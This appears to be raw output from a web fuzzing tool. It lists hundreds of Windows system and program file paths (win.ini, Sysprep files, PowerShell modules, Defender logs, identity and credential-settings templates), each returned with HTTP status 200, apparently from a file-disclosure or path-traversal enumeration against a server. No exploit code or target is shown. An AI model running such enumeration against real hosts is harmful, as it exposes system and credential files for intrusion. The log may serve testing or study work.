000004723:   200        2566 L   2975 W     57165 Ch    "Windows/System32/IME/IMEJP/APPLETS/IMJPCLST.XML"                                                      
000004728:   200        668 L    11132 W    138303 Ch   "windows/system32/license.rtf"                                                                         
000004718:   200        178 L    194 W      5868 Ch     "Windows/System32/icsxml/cmnicfg.xml"                                                                  
000004735:   200        44 L     360 W      3103 Ch     "Windows/System32/mmc.exe.config"                                                                      
000004737:   200        489 L    1549 W     30811 Ch    "Windows/System32/NarratorControlTemplates.xml"                                                        
000004749:   200        58 L     219 W      3266 Ch     "Windows/System32/Speech_OneCore/common/en-US/Tokens_SR_en-US-N.xml"                                   
000004755:   200        20 L     46 W       383 Ch      "Windows/System32/spool/drivers/x64/3/tsprint-PipelineConfig.xml"                                      
000004754:   200        2 L      5 W        53 Ch       "Windows/System32/spool/drivers/W32X86/3/unishare-pipelineconfig.xml"                                  
000004753:   200        99 L     2218 W     14037 Ch    "Windows/System32/Speech_OneCore/common/tokens.xml"                                                    
000004752:   200        26 L     124 W      1743 Ch     "Windows/System32/Speech_OneCore/common/en-US/Tokens_VoiceActivation_en-US.xml"                        
000004751:   200        40 L     209 W      3258 Ch     "Windows/System32/Speech_OneCore/common/en-US/tokens_TTS_en-US.xml"                                    
000004750:   200        22 L     111 W      1715 Ch     "Windows/System32/Speech_OneCore/common/en-US/tokens_TTS_en-US_david.xml"                              
000004744:   200        320 L    2540 W     47020 Ch    "Windows/System32/slmgr/0409/slmgr.ini"                                                                
000004743:   200        417 L    420 W      10427 Ch    "Windows/System32/ScavengeSpace.xml"                                                                   
000004740:   200        116 L    850 W      20908 Ch    "Windows/System32/OEMDefaultAssociations.xml"                                                          
000004742:   200        22 L     61 W       1102 Ch     "Windows/System32/Recovery/ReAgent.xml"                                                                
000004739:   200        463 L    866 W      21656 Ch    "Windows/System32/NetTrace.PLA.Diagnostics.xml"                                                        
000004738:   200        16 L     26 W       565 Ch      "Windows/System32/NdfEventView.xml"                                                                    
000004756:   200        2 L      5 W        53 Ch       "Windows/System32/spool/drivers/x64/3/unishare-pipelineconfig.xml"                                     
000004758:   200        17 L     14 W       425 Ch      "Windows/System32/spool/tools/Microsoft Print To PDF/MPDW-manifest.ini"                                
000004762:   200        1 L      1 W        12 Ch       "Windows/System32/spool/tools/Microsoft XPS Document Writer/mxdw-pipelineconfig.xml"                   
000004786:   200        33 L     70 W       1673 Ch     "Windows/System32/tcpbidi.xml"                                                                         
000004797:   200        79 L     107 W      2404 Ch     "Windows/System32/WimBootCompress.ini"                                                                 
000004796:   200        11 L     27 W       612 Ch      "Windows/System32/WdsUnattendTemplate.xml"                                                             
000004794:   200        26 L     99 W       2866 Ch     "Windows/System32/wbem/xsl-mappings.xml"                                                               
000004793:   200        352 L    2231 W     39002 Ch    "Windows/System32/wbem/Performance/WmiApRpl.ini"                                                       
000004620:   200        624 L    7154 W     1308311 C   "Windows/SoftwareDistribution/DataStore/Logs/edbtmp.log"                                               
                                            h                                                                                                                  
000004788:   200        7 L      11 W       146 Ch      "Windows/System32/UevAppMonitor.exe.config"                                                            
000004785:   200        5 L      15 W       284 Ch      "Windows/System32/SystemResetPlatform/SystemResetPlugins.xml"                                          
000004787:   200        1951 L   6070 W     60124 Ch    "Windows/System32/tcpmon.ini"                                                                          
000004775:   200        115 L    582 W      19949 Ch    "Windows/System32/Sysprep/ActionFiles/Specialize.xml"                                                  
000004774:   200        2 L      12 W       415 Ch      "Windows/System32/Sysprep/ActionFiles/Respecialize.xml"                                                
000004741:   200        4431 L   67285 W    840962 Ch   "Windows/System32/PerfStringBackup.INI"                                                                
000004772:   200        74 L     380 W      12892 Ch    "Windows/System32/Sysprep/ActionFiles/Cleanup.xml"                                                     
000004773:   200        207 L    918 W      32907 Ch    "Windows/System32/Sysprep/ActionFiles/Generalize.xml"                                                  
000004761:   200        15 L     12 W       353 Ch      "Windows/System32/spool/tools/Microsoft XPS Document Writer/mxdw-manifest.ini"                         
000004760:   200        7 L      20 W       394 Ch      "Windows/System32/spool/tools/Microsoft Print To PDF/MPDW-pipelineconfig.xml"                          
000004757:   200        12 L     21 W       424 Ch      "Windows/System32/spool/tools/Microsoft Print To PDF/MPDW_devmode_map.xml"                             
000004759:   200        105 L    221 W      7795 Ch     "Windows/System32/spool/tools/Microsoft Print To PDF/MPDW-PDC.xml"                                     
000004798:   200        8 L      261 W      1649 Ch     "Windows/System32/WindowsCodecsRaw.txt"                                                                
000004800:   200        6 L      76 W       461 Ch      "Windows/System32/WindowsPowerShell/v1.0/Examples/profile.ps1"                                         
000004799:   200        112 L    430 W      3568 Ch     "Windows/System32/WindowsPowerShell/v1.0/en-US/default.help.txt"                                       
000004806:   200        11 L     20 W       465 Ch      "Windows/System32/WindowsPowerShell/v1.0/powershell_ise.exe.config"                                    
000004814:   200        16 L     58 W       1962 Ch     "Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0_32/UsageLogs/powershell.exe.log
                                                        "                                                                                                      
000004820:   200        82 L     91 W       2612 Ch     "Windows/SysWOW64/icsxml/potscfg.xml"                                                                  
000004819:   200        46 L     35 W       780 Ch      "Windows/SysWOW64/icsxml/osinfo.xml"                                                                   
000004818:   200        373 L    397 W      13451 Ch    "Windows/SysWOW64/icsxml/ipcfg.xml"                                                                    
000004817:   200        178 L    194 W      5868 Ch     "Windows/SysWOW64/icsxml/cmnicfg.xml"                                                                  
000004816:   200        42 L     157 W      3007 Ch     "Windows/SysWOW64/F12/Timeline.cpu.xml"                                                                
000004815:   200        14 L     68 W       646 Ch      "Windows/SysWOW64/drivers/gmreadme.txt"                                                                
000004811:   200        2 L      2 W        26 Ch       "Windows/SystemResources/Windows.UI.Logon"                                                             
000004810:   200        68 L     233 W      4675 Ch     "Windows/System32/wsmanconfig_schema.xml"                                                              
000004809:   200        11 L     41 W       724 Ch      "Windows/System32/wpr.config.xml"                                                                      
000004812:   200        50 L     98 W       3232 Ch     "Windows/SysWOW64/AppxProvisioning.xml"                                                                
000004807:   200        11 L     17 W       395 Ch      "Windows/System32/WindowsPowerShell/v1.0/powershell.exe.config"                                        
000004801:   200        92 L     96 W       3913 Ch     "Windows/System32/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.LocalAccounts/1.0.0.0/LocalAccoun
                                                        ts.format.ps1xml"                                                                                      
000004804:   200        2667 L   7601 W     110187 Ch   "Windows/System32/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.ODataUtils/Microsoft.PowerShell.O
                                                        DataV4Adapter.ps1"                                                                                     
000004823:   200        1056 L   2113 W     33460 Ch    "Windows/SysWOW64/MailContactsCalendarSync/LiveDomainList.txt"                                         
000004821:   200        404 L    429 W      14434 Ch    "Windows/SysWOW64/icsxml/pppcfg.xml"                                                                   
000004805:   200        749 L    2320 W     50665 Ch    "Windows/System32/WindowsPowerShell/v1.0/Modules/ProcessMitigations/Microsoft.ProcessMitigations.Comman
                                                        ds.dll-Help.xml"                                                                                       
000004803:   200        782 L    7386 W     51630 Ch    "Windows/System32/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.ODataUtils/Microsoft.PowerShell.O
                                                        DataUtilsHelper.ps1"                                                                                   
000004808:   200        696 L    5175 W     102518 Ch   "Windows/System32/winrm/0409/winrm.ini"                                                                
000004813:   200        5 L      14 W       642 Ch      "Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0_32/UsageLogs/NGenTask.exe.log" 
000004802:   200        2070 L   24629 W    171100 Ch   "Windows/System32/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.ODataUtils/Microsoft.PowerShell.O
                                                        DataAdapter.ps1"                                                                                       
000004827:   200        320 L    2540 W     47020 Ch    "Windows/SysWOW64/slmgr/0409/slmgr.ini"                                                                
000004840:   200        6 L      76 W       461 Ch      "Windows/SysWOW64/WindowsPowerShell/v1.0/Examples/profile.ps1"                                         
000004835:   200        33 L     70 W       1673 Ch     "Windows/SysWOW64/tcpbidi.xml"                                                                         
000004838:   200        8 L      261 W      1649 Ch     "Windows/SysWOW64/WindowsCodecsRaw.txt"                                                                
000004842:   200        782 L    7386 W     51630 Ch    "Windows/SysWOW64/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.ODataUtils/Microsoft.PowerShell.O
                                                        DataUtilsHelper.ps1"                                                                                   
000004839:   200        112 L    430 W      3568 Ch     "Windows/SysWOW64/WindowsPowerShell/v1.0/en-US/default.help.txt"                                       
000004837:   200        79 L     107 W      2404 Ch     "Windows/SysWOW64/WimBootCompress.ini"                                                                 
000004834:   200        99 L     2218 W     14037 Ch    "Windows/SysWOW64/Speech_OneCore/Common/tokens.xml"                                                    
000004836:   200        26 L     99 W       2866 Ch     "Windows/SysWOW64/wbem/xsl-mappings.xml"                                                               
000004833:   200        40 L     209 W      3258 Ch     "Windows/SysWOW64/Speech_OneCore/Common/en-US/tokens_TTS_en-US.xml"                                    
000004841:   200        2070 L   24629 W    171100 Ch   "Windows/SysWOW64/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.ODataUtils/Microsoft.PowerShell.O
                                                        DataAdapter.ps1"                                                                                       
000004832:   200        22 L     111 W      1715 Ch     "Windows/SysWOW64/Speech_OneCore/Common/en-US/tokens_TTS_en-US_david.xml"                              
000004831:   200        58 L     219 W      3266 Ch     "Windows/SysWOW64/Speech_OneCore/Common/en-US/Tokens_SR_en-US-N.xml"                                   
000004826:   200        17 L     45 W       835 Ch      "Windows/SysWOW64/Recovery/ReAgent.xml"                                                                
000004825:   200        16 L     26 W       565 Ch      "Windows/SysWOW64/NdfEventView.xml"                                                                    
000004824:   200        44 L     360 W      3103 Ch     "Windows/SysWOW64/mmc.exe.config"                                                                      
000004843:   200        2667 L   7601 W     110187 Ch   "Windows/SysWOW64/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.ODataUtils/Microsoft.PowerShell.O
                                                        DataV4Adapter.ps1"                                                                                     
000004845:   200        11 L     17 W       395 Ch      "Windows/SysWOW64/WindowsPowerShell/v1.0/powershell.exe.config"                                        
000004849:   200        14 L     93 W       957 Ch      "Windows/Temp/ASPNETSetup_00000.log"                                                                   
000004822:   200        2566 L   2975 W     57165 Ch    "Windows/SysWOW64/IME/IMEJP/APPLETS/IMJPCLST.XML"                                                      
000004848:   200        23 L     23 W       543 Ch      "windows/temp/"                                                                                        
000004850:   200        14 L     93 W       959 Ch      "Windows/Temp/ASPNETSetup_00001.log"                                                                   
000004847:   200        68 L     233 W      4675 Ch     "Windows/SysWOW64/wsmanconfig_schema.xml"                                                              
000004844:   200        11 L     20 W       465 Ch      "Windows/SysWOW64/WindowsPowerShell/v1.0/powershell_ise.exe.config"                                    
000004846:   200        696 L    5175 W     102518 Ch   "Windows/SysWOW64/winrm/0409/winrm.ini"                                                                
000004867:   200        1364 L   10757 W    235903 Ch   "Windows/Temp/msedge_installer.log"                                                                    
000004880:   200        4 L      32 W       276 Ch      "windows/windowsupdate.log"                                                                            
000004879:   200        7 L      12 W       92 Ch       "windows/win.ini"                                                                                      
000004878:   200        46 L     272 W      3870 Ch     "Windows/WaaS/tasks/17499b8d805e9480903b0df0326a3d231841049e.xml"                                      
000004877:   200        75 L     502 W      6270 Ch     "Windows/WaaS/tasks/5ffea6126f02e78b9099eb4614d2d339f03ca5a8.xml"                                      
000004876:   200        28 L     292 W      3682 Ch     "Windows/WaaS/services/ceb497ee0184aaa4681d2fb2ef242a5b8551eea8.xml"                                   
000004875:   200        33 L     367 W      4110 Ch     "Windows/WaaS/services/2213703c9c64cc61ba900531652e23c84728d2a2.xml"                                   
000004874:   200        28 L     291 W      3580 Ch     "Windows/WaaS/services/315818c03ccc2b10070df2d4ebd09eb6c4c66e58.xml"                                   
000004873:   200        28 L     290 W      4196 Ch     "Windows/WaaS/services/43ee7b2a373632f9a701249fd96d0edec2ff1279.xml"                                   
000004872:   200        28 L     286 W      3278 Ch     "Windows/WaaS/services/20bbcadaff3e0543ef358ba4dd8b74bfe8e747c8.xml"                                   
000004871:   200        28 L     290 W      4212 Ch     "Windows/WaaS/services/14a3f9e824793931d34f7f786a538bbc9ef1f0d6.xml"                                   
000004870:   200        36 L     788 W      3188 Ch     "Windows/Vss/Writers/System/D61D61C8-D73A-4EEE-8CDD-F6F9786B7124.xml"                                  
000004869:   200        31 L     630 W      2776 Ch     "Windows/Vss/Writers/System/75DFB225-E2E4-4d39-9AC9-FFAFF65DDF06.xml"                                  
000004868:   200        66 L     1760 W     6456 Ch     "Windows/Vss/Writers/System/0bada1de-01a9-4625-8278-69e735f39dd2.xml"                                  
000004865:   200        879 L    5195 W     80878 Ch    "Windows/Temp/MpCmdRun.log"                                                                            
000004866:   200        1036 L   18320 W    179012 Ch   "Windows/Temp/MpSigStub.log"                                                                           
000004947:   200        499 L    532 W      20699 Ch    "Program Files (x86)/Windows Media Player/Media Renderer/avtransport.xml"                              
000004614:   200        47072    141882 W   7572588 C   "Windows/servicing/Sessions/Sessions.xml"                                                              
                        L                   h                                                                                                                  
000004950:   200        164 L    173 W      6363 Ch     "Program Files (x86)/Windows Media Player/Media Renderer/RenderingControl.xml"                         
000004949:   200        64 L     70 W       2355 Ch     "Program Files (x86)/Windows Media Player/Media Renderer/RenderingControl_DMP.xml"                     
000004948:   200        132 L    145 W      5428 Ch     "Program Files (x86)/Windows Media Player/Media Renderer/connectionmanager_dmr.xml"                    
000004967:   200        20 L     89 W       1434 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/auxpad/auxbase.xml"                     
000004975:   200        46 L     256 W      3524 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_altgr.xml"                    
000004980:   200        19 L     45 W       617 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_rtl.xml"                      
000004977:   200        23 L     57 W       738 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_heb.xml"                      
000004979:   200        6 L      27 W       480 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_kor.xml"                      
000004978:   200        8 L      43 W       804 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_jpn.xml"                      
000004973:   200        5 L      19 W       390 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad/kor-kor.xml"                     
000004976:   200        46 L     256 W      3529 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_ca.xml"                       
000004981:   200        46 L     234 W      3333 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base.xml"                          
000004972:   200        15 L     60 W       903 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad/keypadbase.xml"                  
000004974:   200        979 L    3305 W     44503 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main.xml"                               
000004971:   200        5 L      19 W       382 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad/ea.xml"                          
000004970:   200        18 L     42 W       693 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad.xml"                             
000004969:   200        15 L     60 W       903 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/insert/insertbase.xml"                  
000004966:   200        3 L      10 W       212 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/auxpad.xml"                             
000004968:   200        3 L      9 W        215 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/insert.xml"                             
000004982:   200        2 L      9 W        247 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/baseAltGr_rtl.xml"                 
000004984:   200        199 L    1179 W     14833 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/ko-kr.xml"                         
000004988:   200        3 L      10 W       221 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskclearui.xml"                         
000004996:   200        3 L      10 W       215 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskpred.xml"                            
000005012:   200        30 L     285 W      2658 Ch     "Program Files/Common Files/microsoft shared/ink/ipsfin.xml"                                           
000004965:   200        430 L    1618 W     27045 Ch    "Program Files/Common Files/microsoft shared/ink/Content.xml"                                          
000005031:   200        7 L      254 W      2720 Ch     "Program Files/Common Files/microsoft shared/ink/ipstr.xml"                                            
000005030:   200        30 L     255 W      2520 Ch     "Program Files/Common Files/microsoft shared/ink/ipssve.xml"                                           
000005029:   200        30 L     288 W      2596 Ch     "Program Files/Common Files/microsoft shared/ink/ipssrl.xml"                                           
000005028:   200        30 L     261 W      2568 Ch     "Program Files/Common Files/microsoft shared/ink/ipssrb.xml"                                           
000005027:   200        30 L     257 W      2542 Ch     "Program Files/Common Files/microsoft shared/ink/ipsrus.xml"                                           
000005026:   200        30 L     294 W      2644 Ch     "Program Files/Common Files/microsoft shared/ink/ipsrom.xml"                                           
000005025:   200        29 L     146 W      2240 Ch     "Program Files/Common Files/microsoft shared/ink/ipsptg.xml"                                           
000005024:   200        29 L     147 W      2246 Ch     "Program Files/Common Files/microsoft shared/ink/ipsptb.xml"                                           
000005023:   200        30 L     285 W      2600 Ch     "Program Files/Common Files/microsoft shared/ink/ipsplk.xml"                                           
000005022:   200        30 L     285 W      2580 Ch     "Program Files/Common Files/microsoft shared/ink/ipsnor.xml"                                           
000005021:   200        30 L     285 W      2626 Ch     "Program Files/Common Files/microsoft shared/ink/ipsnld.xml"                                           
000005020:   200        30 L     291 W      2566 Ch     "Program Files/Common Files/microsoft shared/ink/ipskor.xml"                                           
000005019:   200        30 L     287 W      2522 Ch     "Program Files/Common Files/microsoft shared/ink/ipsjpn.xml"                                           
000005018:   200        29 L     253 W      2526 Ch     "Program Files/Common Files/microsoft shared/ink/ipsita.xml"                                           
000005017:   200        1 L      238 W      2570 Ch     "Program Files/Common Files/microsoft shared/ink/ipsid.xml"                                            
000004736:   200        9 L      1078 W     4194273 C   "Windows/System32/MsDtc/MSDTC.LOG"                                                                     
                                            h                                                                                                                  
000005008:   200        30 L     286 W      2616 Ch     "Program Files/Common Files/microsoft shared/ink/ipsdeu.xml"                                           
000005007:   200        30 L     255 W      2514 Ch     "Program Files/Common Files/microsoft shared/ink/ipsdan.xml"                                           
000004964:   200        14715    74326 W    736191 Ch   "Program Files/Common Files/microsoft shared/ink/Alphabet.xml"                                         
                        L                                                                                                                                      
000005016:   200        30 L     289 W      2652 Ch     "Program Files/Common Files/microsoft shared/ink/ipshrv.xml"                                           
000005015:   200        3 L      318 W      2518 Ch     "Program Files/Common Files/microsoft shared/ink/ipshi.xml"                                            
000005014:   200        3 L      243 W      2532 Ch     "Program Files/Common Files/microsoft shared/ink/ipshe.xml"                                            
000005009:   200        4 L      241 W      2618 Ch     "Program Files/Common Files/microsoft shared/ink/ipsel.xml"                                            
000005013:   200        30 L     307 W      2628 Ch     "Program Files/Common Files/microsoft shared/ink/ipsfra.xml"                                           
000005010:   200        30 L     285 W      2578 Ch     "Program Files/Common Files/microsoft shared/ink/ipsen.xml"                                            
000005011:   200        34 L     334 W      3024 Ch     "Program Files/Common Files/microsoft shared/ink/ipsesp.xml"                                           
000005005:   200        30 L     264 W      2436 Ch     "Program Files/Common Files/microsoft shared/ink/ipscht.xml"                                           
000005004:   200        30 L     264 W      2462 Ch     "Program Files/Common Files/microsoft shared/ink/ipschs.xml"                                           
000005003:   200        30 L     262 W      2592 Ch     "Program Files/Common Files/microsoft shared/ink/ipscat.xml"                                           
000005002:   200        4 L      232 W      2418 Ch     "Program Files/Common Files/microsoft shared/ink/ipsar.xml"                                            
000005001:   200        63 L     333 W      3812 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols/symbase.xml"                    
000005000:   200        13 L     57 W       790 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols/ja-jp-sym.xml"                  
000004999:   200        11 L     47 W       680 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols/ea-sym.xml"                     
000004998:   200        13 L     36 W       591 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols.xml"                            
000004995:   200        35 L     146 W      1851 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknumpad/osknumpadbase.xml"            
000004994:   200        3 L      10 W       219 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknumpad.xml"                          
000004997:   200        13 L     59 W       922 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskpred/oskpredbase.xml"                
000004992:   200        3 L      10 W       213 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknav.xml"                             
000004993:   200        17 L     75 W       1067 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/osknav/osknavbase.xml"                  
000004991:   200        6 L      25 W       469 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskmenu/oskmenubase.xml"                
000004990:   200        3 L      10 W       215 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskmenu.xml"                            
000004989:   200        10 L     44 W       735 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/oskclearui/oskclearuibase.xml"          
000004987:   200        212 L    1001 W     10633 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/zh-phonetic.xml"                   
000005006:   200        30 L     257 W      2556 Ch     "Program Files/Common Files/microsoft shared/ink/ipscsy.xml"                                           
000004986:   200        212 L    1029 W     10697 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/zh-dayi.xml"                       
000004983:   200        216 L    1209 W     16102 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/ja-jp.xml"                         
000004985:   200        212 L    941 W      9593 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/zh-changjei.xml"                   
000004613:   200        47072    141882 W   7572588 C   "Windows/servicing/Sessions/Sessions.back.xml"                                                         
                        L                   h                                                                                                                  
000006067:   200        4 L      90 W       12975 Ch    "ProgramData/Microsoft/IdentityCRL/INT/wlidsvcconfig.xml"                                              
000006051:   200        150 L    144 W      5422 Ch     "Program Files/Windows Media Player/Network Sharing/ConnectionManager.xml"                             
000006086:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin64.xml"                          
000006085:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin32.xml"                          
000006084:   200        1996 L   2711 W     72783 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win64.xml"                                
000006083:   200        1996 L   2711 W     72783 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win32.xml"                                
000006082:   200        26 L     70 W       955 Ch      "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftNotepad.xml"                                        
000006081:   200        74 L     129 W      2863 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win64.xml"                                  
000006080:   200        74 L     129 W      2863 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win32.xml"                                  
000006079:   200        109 L    169 W      3966 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftLync2010.xml"                                       
000006078:   200        75 L     153 W      2537 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013Backup.xml"                     
000006077:   200        98 L     193 W      3109 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013.xml"                           
000006076:   200        133 L    253 W      5794 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/EaseOfAccessSettings2013.xml"                                
000006075:   200        391 L    663 W      18176 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/DesktopSettings2013.xml"                                     
000006074:   200        238 L    2062 W     65526 Ch    "ProgramData/Microsoft/SmsRouter/MessageStore/edbtmp.log"                                              
000006068:   200        4 L      90 W       12703 Ch    "ProgramData/Microsoft/IdentityCRL/production/wlidsvcconfig.xml"                                       
000006065:   200        192 L    392 W      11364 Ch    "ProgramData/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/tasks.xml"             
000006064:   200        24 L     141 W      1512 Ch     "ProgramData/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/en-US/resource.xml"    
000006063:   200        225 L    351 W      11005 Ch    "ProgramData/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/tasks.xml"             
000006062:   200        17 L     101 W      1334 Ch     "ProgramData/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/resource.xml"          
000006072:   200        13 L     71 W       65536 Ch    "ProgramData/Microsoft/SmsRouter/MessageStore/edb.log"                                                 
000006061:   200        17 L     101 W      1334 Ch     "ProgramData/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/en-US/resource.xml"    
000006060:   200        29 L     96 W       2913 Ch     "ProgramData/Microsoft/Device Stage/Device/{113527a4-45d4-4b6f-b567-97838f1b04b0}/behavior.xml"        
000006059:   200        22 L     64 W       1741 Ch     "ProgramData/Microsoft/Device Stage/Device/{8702d817-5aad-4674-9ef3-4d3decd87120}/behavior.xml"        
000006058:   200        2 L      2 W        25 Ch       "ProgramData/Microsoft OneDrive/setup/refcount.ini"                                                    
000006053:   200        88 L     99 W       2574 Ch     "Program Files/Windows Media Player/Network Sharing/MediaReceiverRegistrar.xml"                        
000006050:   200        164 L    173 W      6363 Ch     "Program Files/Windows Media Player/Media Renderer/RenderingControl.xml"                               
000006052:   200        221 L    237 W      7515 Ch     "Program Files/Windows Media Player/Network Sharing/ContentDirectory.xml"                              
000006049:   200        64 L     70 W       2355 Ch     "Program Files/Windows Media Player/Media Renderer/RenderingControl_DMP.xml"                           
000006048:   200        132 L    145 W      5428 Ch     "Program Files/Windows Media Player/Media Renderer/connectionmanager_dmr.xml"                          
000006047:   200        499 L    532 W      20699 Ch    "Program Files/Windows Media Player/Media Renderer/avtransport.xml"                                    
000006087:   200        337 L    568 W      10594 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win32.xml"                       
000006089:   200        1864 L   2602 W     68365 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win32.xml"                                
000006101:   200        26 L     71 W       1003 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftWordpad.xml"                                        
000006093:   200        1788 L   2504 W     65729 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win32.xml"                                
000006105:   200        26 L     33 W       890 Ch      "ProgramData/Microsoft/UEV/InboxTemplates/VdiState.xml"                                                
000006104:   200        60 L     152 W      2521 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/ThemeSettings2013.xml"                                       
000006103:   200        71 L     199 W      3253 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/RoamingCredentialSettings.xml"                               
000006100:   200        74 L     131 W      2889 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win64.xml"                      
000006102:   200        46 L     131 W      2038 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/NetworkPrinters.xml"                                         
000006099:   200        74 L     131 W      2889 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win32.xml"                      
000006098:   200        32 L     89 W       1289 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin64.xml"                             
000006097:   200        32 L     89 W       1289 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin32.xml"                             
000006096:   200        32 L     89 W       1286 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin64.xml"                             
000006095:   200        32 L     89 W       1286 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin32.xml"                             
000006092:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin64.xml"                          
000006094:   200        1788 L   2504 W     65732 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win64.xml"                                
000006091:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin32.xml"                          
000006088:   200        337 L    568 W      10594 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win64.xml"                       
000006108:   200        5 L      11 W       120 Ch      "ProgramData/Microsoft/Windows Defender/Scans/History/Service/Unknown.Log"                             
000006090:   200        1864 L   2602 W     68365 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win64.xml"                                
000006117:   200        364 L    921 W      16858 Ch    "ProgramData/Microsoft/Windows/Power Efficiency Diagnostics/energy-report-latest.xml"                  
000006144:   200        0 L      1 W        12 Ch       "system volume information/wpsettings.dat"                                                             
000006066:   200        1416 L   8468 W     533394 Ch   "ProgramData/Microsoft/EdgeUpdate/Log/MicrosoftEdgeUpdate.log"                                         
000006179:   200        4 L      90 W       12703 Ch    "Users/All Users/Microsoft/IdentityCRL/production/wlidsvcconfig.xml"                                   
000006189:   200        75 L     153 W      2537 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013Backup.xml"                 
000006188:   200        98 L     193 W      3109 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013.xml"                       
000006187:   200        133 L    253 W      5794 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/EaseOfAccessSettings2013.xml"                            
000006186:   200        391 L    663 W      18176 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/DesktopSettings2013.xml"                                 
